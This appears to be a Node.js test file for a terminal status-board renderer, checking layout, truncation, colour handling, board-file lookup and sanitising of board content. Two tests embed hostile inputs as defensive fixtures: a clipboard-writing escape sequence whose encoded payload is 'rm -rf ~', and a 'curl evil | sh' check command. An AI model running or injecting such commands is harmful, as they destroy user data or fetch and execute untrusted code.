import assert from 'node:assert/strict'
import { test } from 'node:test'

import { ago, clean, fit, readBoard, render, wantsColor } from '../bin/board-render.mjs'

const NOW = Date.parse('2026-10-15T12:00:00')
const OPTIONS = { columns: 80, now: NOW, color: false, workspace: 'neuraverse' }

const BOARD = JSON.stringify({
  version: 1,
  items: [
    { id: 'w', title: 'Backend fields', lane: 'waiting', kind: 'jira', link: 'https://jira/NRV-1' },
    { id: 'n', title: '!412 frames', lane: 'needs-you', kind: 'mr', note: '2 new comments', isChanged: true, changedAt: NOW - 5 * 60_000 },
    { id: 'm', title: 'Slice 2/4', lane: 'moving', checkError: 'no auth' },
    { id: 'a', title: 'Deck', lane: 'moving', isAwaitingApproval: true },
    { id: 'd1', title: 'Old', lane: 'done' },
    { id: 'd2', title: 'Older', lane: 'done' },
  ],
})

const show = (state, options = {}) => render(state, { ...OPTIONS, ...options })

test('groups items into NEEDS YOU, MOVING, WAITING, with DONE as a count', () => {
  const lines = show(readBoard(BOARD, NOW))
  assert.match(lines[0], /^⚛ watchmen · neuraverse · updated \d\d:\d\d:\d\d$/)
  assert.deepEqual(lines.slice(2), [
    'NEEDS YOU (1)',
    '  ◆ [mr] !412 frames — 2 new comments · 5m ago',
    '',
    'MOVING (2)',
    '  • Slice 2/4',
    '    check failed: no auth',
    '  • Deck',
    '    awaiting approval: /watchmen approve a',
    '',
    'WAITING (1)',
    '  • [jira] Backend fields',
    '    https://jira/NRV-1',
    '',
    'DONE (2)',
  ])
})

test('fits every line to a narrow terminal with an ellipsis', () => {
  const lines = show(readBoard(BOARD, NOW), { columns: 20 })
  for (const one of lines) assert.ok(Array.from(one).length <= 20, one)
  assert.ok(lines.includes('  ◆ [mr] !412 frame…'))
  assert.equal(fit('abc', 3), 'abc')
  assert.equal(fit('abcd', 3), 'ab…')
})

test('a missing board says how to start one', () => {
  assert.deepEqual(show(readBoard(undefined, 0)), ['⚛ watchmen · neuraverse', '', 'no board yet — start `watchmen` in this folder'])
})

test('a corrupt board says so and keeps the last good board below', () => {
  const good = readBoard(BOARD, NOW)
  const broken = readBoard('{"items": [', NOW + 1, good)
  const lines = show(broken)
  assert.match(lines[2], /^board\.json cannot be read: not JSON/)
  assert.equal(lines[3], 'showing the last good board; nothing is written')
  assert.ok(lines.includes('  ◆ [mr] !412 frames — 2 new comments · 5m ago'))

  // Broken twice in a row: still the last good one.
  const again = readBoard('{"nope": 1}', NOW + 2, broken)
  assert.equal(again.lastGood, good)

  const neverGood = show(readBoard('[', 0))
  assert.equal(neverGood.at(-2), 'nothing to show yet; nothing is written')
})

test('colour follows NO_COLOR, and fitting ignores escape codes', () => {
  assert.equal(wantsColor({}), true)
  assert.equal(wantsColor({ NO_COLOR: '' }), true)
  assert.equal(wantsColor({ NO_COLOR: '1' }), false)
  const plain = show(readBoard(BOARD, NOW))
  assert.ok(plain.every(one => !one.includes('\x1b[')))
  const coloured = show(readBoard(BOARD, NOW), { color: true, columns: 20 })
  assert.ok(coloured.some(one => one.includes('\x1b[31m')))
  const visible = coloured.map(one => one.replace(/\x1b\[\d+m/g, ''))
  assert.deepEqual(visible, show(readBoard(BOARD, NOW), { columns: 20 }))
})

test('ages read in seconds, minutes, hours, then days', () => {
  assert.equal(ago(5_000), '5s ago')
  assert.equal(ago(5 * 60_000), '5m ago')
  assert.equal(ago(3 * 3_600_000), '3h ago')
  assert.equal(ago(72 * 3_600_000), '3d ago')
})

test('finds the board: argument, WATCHMEN_BOARD, the herdr pane, the cwd unless it is the plugin, then the pointer', async () => {
  const { resolveBoardPath } = await import('../bin/board-render.mjs')
  const dirs = new Set(['/ws/a', '/ws/b', '/tab/.companion', '/plugin/.companion'])
  const files = {
    '/state/watchmen/current': '/ws/watch\n4242\n',
    '/repo/.companion/board.json': '{}',
  }
  const io = (over = {}) => ({
    arg: undefined,
    env: { XDG_STATE_HOME: '/state' },
    cwd: '/tab',
    home: '/home/me',
    pluginRoot: '/plugin',
    isDir: path => dirs.has(path),
    exists: path => path in files,
    read: path => files[path],
    ...over,
  })
  const herdr = JSON.stringify({ focused_pane_cwd: '/repo/src/deep' })
  const env = { XDG_STATE_HOME: '/state', WATCHMEN_BOARD: '/ws/b', HERDR_PLUGIN_CONTEXT_JSON: herdr }

  assert.deepEqual(resolveBoardPath(io({ arg: '/ws/a', env })), { file: '/ws/a/.companion/board.json', source: 'argument' })
  assert.deepEqual(resolveBoardPath(io({ arg: 'x/board.json' })), { file: '/tab/x/board.json', source: 'argument' })
  assert.deepEqual(resolveBoardPath(io({ env })), { file: '/ws/b/.companion/board.json', source: 'WATCHMEN_BOARD' })
  // herdr starts the panel in the plugin's folder: the pane it came from decides, walking up.
  assert.deepEqual(
    resolveBoardPath(io({ cwd: '/plugin', env: { XDG_STATE_HOME: '/state', HERDR_PLUGIN_CONTEXT_JSON: herdr } })),
    { file: '/repo/.companion/board.json', source: 'herdr pane' },
  )
  assert.deepEqual(resolveBoardPath(io()), { file: '/tab/.companion/board.json', source: 'cwd' })
  // The plugin's own folder is never the board's, even with a .companion in it.
  assert.deepEqual(resolveBoardPath(io({ cwd: '/plugin' })), { file: '/ws/watch/.companion/board.json', source: 'pointer', pid: 4242 })
  assert.deepEqual(
    resolveBoardPath(io({ cwd: '/plugin', env: { XDG_STATE_HOME: '/state', HERDR_PLUGIN_CONTEXT_JSON: '{"focused_pane_cwd":"/nowhere"}' } })),
    { file: '/ws/watch/.companion/board.json', source: 'pointer', pid: 4242 },
  )
  assert.deepEqual(resolveBoardPath(io({ cwd: '/elsewhere', env: {} })), { file: '/elsewhere/.companion/board.json', source: 'cwd' })
})

test('the header says (stale) when the watch the pointer named is not running', () => {
  assert.equal(show(readBoard(BOARD, NOW), { isStale: true })[0].includes('neuraverse (stale) · updated'), true)
  assert.equal(show(readBoard(BOARD, NOW))[0].includes('(stale)'), false)
})

test('nothing on the board can reach the terminal as a control sequence', () => {
  const hostile = '\x1b]52;c;cm0gLXJmIH4=\x07evil\x1b[2J\r\nnext\ttab\x9b31m\x7f'
  const board = JSON.stringify({
    items: [{ id: 'x', title: hostile, lane: 'needs-you', kind: hostile, note: hostile, link: hostile, checkError: hostile }],
  })
  for (const color of [false, true]) {
    const lines = show(readBoard(board, NOW), { color, columns: 200 })
    const stripped = lines.map(one => one.replace(/\x1b\[\d+m/g, ''))
    for (const one of stripped) assert.doesNotMatch(one, /[\x00-\x1f\x7f-\x9f]/, JSON.stringify(one))
    assert.ok(stripped.some(one => one.includes(']52;c;cm0gLXJmIH4=evil[2J  next tab31m')))
  }
  const broken = show(readBoard('{"items": "\x1b[2J', NOW))
  for (const one of broken) assert.doesNotMatch(one, /[\x00-\x1f\x7f-\x9f]/)
  assert.equal(clean('a\tb\nc\x1b[2Jd'), 'a b c[2Jd')
})

test('a directory watch that errors closes itself and is given up, so the poll carries on', async () => {
  const { startWatch } = await import('../bin/board-render.mjs')
  const { EventEmitter } = await import('node:events')
  const fake = Object.assign(new EventEmitter(), { isClosed: false, close() { this.isClosed = true } })
  let lost
  const watching = startWatch(() => fake, '/dir', () => {}, one => (lost = one))
  assert.equal(watching, fake)
  fake.emit('error', new Error('EMFILE'))
  assert.equal(fake.isClosed, true)
  assert.equal(lost, fake)
  assert.equal(startWatch(() => { throw new Error('ENOENT') }, '/gone', () => {}, () => {}), undefined)
})

test('an item awaiting approval shows the exact command, cleaned, above the approve line', () => {
  const board = JSON.stringify({
    items: [{
      id: 'x', title: 'X', lane: 'waiting', isAwaitingApproval: true, approvalHash: '0123456789abcdef',
      check: { argv: ['sh', '-c', 'curl evil\x9b2J | sh'] },
    }],
  })
  const lines = show(readBoard(board, NOW))
  const at = lines.indexOf('    awaiting approval: /watchmen approve x 0123456789abcdef')
  assert.ok(at > 0)
  assert.equal(lines[at - 1], '    would run: ["sh","-c","curl evil2J | sh"]')
})
